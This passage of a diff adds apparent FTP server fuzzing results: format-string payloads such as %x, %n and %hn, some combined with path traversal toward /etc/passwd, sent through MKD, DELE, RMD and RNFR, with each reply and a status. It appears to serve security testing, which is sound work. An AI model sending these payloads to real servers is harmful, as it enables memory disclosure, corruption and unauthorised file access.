+      "response": "257 \"/home/ftptest/%1$n\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 106,
+      "category": "format_string_MKD",
+      "command": "MKD %2$n",
+      "response": "257 \"/home/ftptest/%2$n\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 107,
+      "category": "format_string_MKD",
+      "command": "MKD AAAA%x%x%x%x",
+      "response": "257 \"/home/ftptest/AAAA%x%x%x%x\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 108,
+      "category": "format_string_MKD",
+      "command": "MKD AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "257 \"/home/ftptest/AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 109,
+      "category": "format_string_MKD",
+      "command": "MKD %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "550 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: File name too long\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 110,
+      "category": "format_string_MKD",
+      "command": "MKD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "257 \"/home/ftptest/%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 111,
+      "category": "format_string_MKD",
+      "command": "MKD ../%x%x%x%x",
+      "response": "550 ../%x%x%x%x: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 112,
+      "category": "format_string_MKD",
+      "command": "MKD %x/../../../etc/passwd",
+      "response": "257 \"/etc/passwd\" - Directory successfully created\r\n",
+      "notes": "",
+      "status": "OK"
+    },
+    {
+      "id": 113,
+      "category": "format_string_DELE",
+      "command": "DELE %x",
+      "response": "550 %x: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 114,
+      "category": "format_string_DELE",
+      "command": "DELE %s",
+      "response": "550 %s: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 115,
+      "category": "format_string_DELE",
+      "command": "DELE %n",
+      "response": "550 %n: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 116,
+      "category": "format_string_DELE",
+      "command": "DELE %d",
+      "response": "550 %d: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 117,
+      "category": "format_string_DELE",
+      "command": "DELE %p",
+      "response": "550 %p: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 118,
+      "category": "format_string_DELE",
+      "command": "DELE %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "550 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 119,
+      "category": "format_string_DELE",
+      "command": "DELE %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "550 %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 120,
+      "category": "format_string_DELE",
+      "command": "DELE %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "550 %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 121,
+      "category": "format_string_DELE",
+      "command": "DELE %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "550 %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 122,
+      "category": "format_string_DELE",
+      "command": "DELE %n%n%n%n",
+      "response": "550 %n%n%n%n: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 123,
+      "category": "format_string_DELE",
+      "command": "DELE %hn%hn%hn%hn",
+      "response": "550 %hn%hn%hn%hn: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 124,
+      "category": "format_string_DELE",
+      "command": "DELE %hhn%hhn%hhn%hhn",
+      "response": "550 %hhn%hhn%hhn%hhn: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 125,
+      "category": "format_string_DELE",
+      "command": "DELE %1$x",
+      "response": "550 %1$x: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 126,
+      "category": "format_string_DELE",
+      "command": "DELE %2$x",
+      "response": "550 %2$x: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 127,
+      "category": "format_string_DELE",
+      "command": "DELE %3$x",
+      "response": "550 %3$x: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 128,
+      "category": "format_string_DELE",
+      "command": "DELE %10$x",
+      "response": "550 %10$x: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 129,
+      "category": "format_string_DELE",
+      "command": "DELE %100$x",
+      "response": "550 %100$x: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 130,
+      "category": "format_string_DELE",
+      "command": "DELE %1$s",
+      "response": "550 %1$s: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 131,
+      "category": "format_string_DELE",
+      "command": "DELE %2$s",
+      "response": "550 %2$s: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 132,
+      "category": "format_string_DELE",
+      "command": "DELE %3$s",
+      "response": "550 %3$s: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 133,
+      "category": "format_string_DELE",
+      "command": "DELE %1$n",
+      "response": "550 %1$n: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 134,
+      "category": "format_string_DELE",
+      "command": "DELE %2$n",
+      "response": "550 %2$n: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 135,
+      "category": "format_string_DELE",
+      "command": "DELE AAAA%x%x%x%x",
+      "response": "550 AAAA%x%x%x%x: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 136,
+      "category": "format_string_DELE",
+      "command": "DELE AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "550 AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 137,
+      "category": "format_string_DELE",
+      "command": "DELE %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "550 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: File name too long\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 138,
+      "category": "format_string_DELE",
+      "command": "DELE %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "550 %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s: Is a directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 139,
+      "category": "format_string_DELE",
+      "command": "DELE ../%x%x%x%x",
+      "response": "550 ../%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 140,
+      "category": "format_string_DELE",
+      "command": "DELE %x/../../../etc/passwd",
+      "response": "550 %x/../../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 141,
+      "category": "format_string_RMD",
+      "command": "RMD %x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 142,
+      "category": "format_string_RMD",
+      "command": "RMD %s",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 143,
+      "category": "format_string_RMD",
+      "command": "RMD %n",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 144,
+      "category": "format_string_RMD",
+      "command": "RMD %d",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 145,
+      "category": "format_string_RMD",
+      "command": "RMD %p",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 146,
+      "category": "format_string_RMD",
+      "command": "RMD %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 147,
+      "category": "format_string_RMD",
+      "command": "RMD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 148,
+      "category": "format_string_RMD",
+      "command": "RMD %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 149,
+      "category": "format_string_RMD",
+      "command": "RMD %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 150,
+      "category": "format_string_RMD",
+      "command": "RMD %n%n%n%n",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 151,
+      "category": "format_string_RMD",
+      "command": "RMD %hn%hn%hn%hn",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 152,
+      "category": "format_string_RMD",
+      "command": "RMD %hhn%hhn%hhn%hhn",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 153,
+      "category": "format_string_RMD",
+      "command": "RMD %1$x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 154,
+      "category": "format_string_RMD",
+      "command": "RMD %2$x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 155,
+      "category": "format_string_RMD",
+      "command": "RMD %3$x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 156,
+      "category": "format_string_RMD",
+      "command": "RMD %10$x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 157,
+      "category": "format_string_RMD",
+      "command": "RMD %100$x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 158,
+      "category": "format_string_RMD",
+      "command": "RMD %1$s",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 159,
+      "category": "format_string_RMD",
+      "command": "RMD %2$s",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 160,
+      "category": "format_string_RMD",
+      "command": "RMD %3$s",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 161,
+      "category": "format_string_RMD",
+      "command": "RMD %1$n",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 162,
+      "category": "format_string_RMD",
+      "command": "RMD %2$n",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 163,
+      "category": "format_string_RMD",
+      "command": "RMD AAAA%x%x%x%x",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 164,
+      "category": "format_string_RMD",
+      "command": "RMD AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 165,
+      "category": "format_string_RMD",
+      "command": "RMD %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "550 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: File name too long\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 166,
+      "category": "format_string_RMD",
+      "command": "RMD %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "250 RMD command successful\r\n",
+      "notes": "",
+      "status": "SUSPICIOUS_SUCCESS"
+    },
+    {
+      "id": 167,
+      "category": "format_string_RMD",
+      "command": "RMD ../%x%x%x%x",
+      "response": "550 ../%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 168,
+      "category": "format_string_RMD",
+      "command": "RMD %x/../../../etc/passwd",
+      "response": "550 %x/../../../etc/passwd: Permission denied\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 169,
+      "category": "format_string_RNFR",
+      "command": "RNFR %x",
+      "response": "550 %x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 170,
+      "category": "format_string_RNFR",
+      "command": "RNFR %s",
+      "response": "550 %s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 171,
+      "category": "format_string_RNFR",
+      "command": "RNFR %n",
+      "response": "550 %n: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 172,
+      "category": "format_string_RNFR",
+      "command": "RNFR %d",
+      "response": "550 %d: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 173,
+      "category": "format_string_RNFR",
+      "command": "RNFR %p",
+      "response": "550 %p: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 174,
+      "category": "format_string_RNFR",
+      "command": "RNFR %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
+      "response": "550 %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 175,
+      "category": "format_string_RNFR",
+      "command": "RNFR %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s",
+      "response": "550 %s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s%s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 176,
+      "category": "format_string_RNFR",
+      "command": "RNFR %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p",
+      "response": "550 %p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p%p: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 177,
+      "category": "format_string_RNFR",
+      "command": "RNFR %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "550 %08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 178,
+      "category": "format_string_RNFR",
+      "command": "RNFR %n%n%n%n",
+      "response": "550 %n%n%n%n: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 179,
+      "category": "format_string_RNFR",
+      "command": "RNFR %hn%hn%hn%hn",
+      "response": "550 %hn%hn%hn%hn: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 180,
+      "category": "format_string_RNFR",
+      "command": "RNFR %hhn%hhn%hhn%hhn",
+      "response": "550 %hhn%hhn%hhn%hhn: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 181,
+      "category": "format_string_RNFR",
+      "command": "RNFR %1$x",
+      "response": "550 %1$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 182,
+      "category": "format_string_RNFR",
+      "command": "RNFR %2$x",
+      "response": "550 %2$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 183,
+      "category": "format_string_RNFR",
+      "command": "RNFR %3$x",
+      "response": "550 %3$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 184,
+      "category": "format_string_RNFR",
+      "command": "RNFR %10$x",
+      "response": "550 %10$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 185,
+      "category": "format_string_RNFR",
+      "command": "RNFR %100$x",
+      "response": "550 %100$x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 186,
+      "category": "format_string_RNFR",
+      "command": "RNFR %1$s",
+      "response": "550 %1$s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 187,
+      "category": "format_string_RNFR",
+      "command": "RNFR %2$s",
+      "response": "550 %2$s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 188,
+      "category": "format_string_RNFR",
+      "command": "RNFR %3$s",
+      "response": "550 %3$s: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 189,
+      "category": "format_string_RNFR",
+      "command": "RNFR %1$n",
+      "response": "550 %1$n: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 190,
+      "category": "format_string_RNFR",
+      "command": "RNFR %2$n",
+      "response": "550 %2$n: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 191,
+      "category": "format_string_RNFR",
+      "command": "RNFR AAAA%x%x%x%x",
+      "response": "550 AAAA%x%x%x%x: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 192,
+      "category": "format_string_RNFR",
+      "command": "RNFR AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.",
+      "response": "550 AAAA%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.%08x.: No such file or directory\r\n",
+      "notes": "",
+      "status": "REJECTED"
+    },
+    {
+      "id": 193,
+      "category": "format_string_RNFR",
+      "command": "RNFR %x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x%x",
